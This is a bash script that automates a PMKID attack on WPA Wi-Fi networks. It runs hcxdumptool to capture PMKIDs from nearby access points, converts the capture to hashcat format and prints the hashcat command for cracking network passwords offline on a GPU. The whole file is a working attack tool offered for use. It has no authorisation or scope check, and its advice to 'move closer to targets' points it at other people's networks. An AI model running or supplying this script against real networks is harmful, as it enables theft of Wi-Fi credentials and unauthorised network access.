#!/bin/bash
# pmkid_attack.sh - PMKID attack (no client needed)

INTERFACE=${1:-wlan1mon}
TIMEOUT=${2:-60}
OUTPUT_DIR=~/captures/pmkid

mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
FILENAME="${OUTPUT_DIR}/pmkid_${TIMESTAMP}"

echo "[*] Starting PMKID attack"
echo "[*] Interface: $INTERFACE"
echo "[*] Timeout: ${TIMEOUT}s"
echo "[*] Output: $FILENAME"

# Run hcxdumptool
sudo timeout "$TIMEOUT" hcxdumptool -i "$INTERFACE" -o "${FILENAME}.pcapng" --enable_status=1

if [ -f "${FILENAME}.pcapng" ]; then
    echo "[*] Capture complete, converting..."
    
    # Convert to hashcat format
    hcxpcapngtool -o "${FILENAME}.hc22000" "${FILENAME}.pcapng"
    
    # Check for PMKIDs
    PMKID_COUNT=$(grep -c "WPA\*02" "${FILENAME}.hc22000" 2>/dev/null || echo "0")
    
    echo "[+] Captured $PMKID_COUNT PMKIDs"
    
    if [ "$PMKID_COUNT" -gt 0 ]; then
        echo "[+] SUCCESS! PMKIDs captured"
        echo "[*] Ready for cracking on GPU:"
        echo "    hashcat -m 22000 ${FILENAME}.hc22000 wordlist.txt"
        
        # Create info file
        cat > "${FILENAME}_info.txt" <<EOF
PMKID Capture Information
=========================
Date: $(date)
Duration: ${TIMEOUT}s
PMKIDs Captured: $PMKID_COUNT

Files:
  - ${FILENAME}.pcapng (raw capture)
  - ${FILENAME}.hc22000 (hashcat format)

Crack with:
  hashcat -m 22000 ${FILENAME}.hc22000 wordlist.txt
  
Or upload via FTP to GPU machine
EOF
    else
        echo "[-] No PMKIDs captured"
        echo "[*] Try increasing timeout or move closer to targets"
    fi
else
    echo "[-] Capture failed"
fi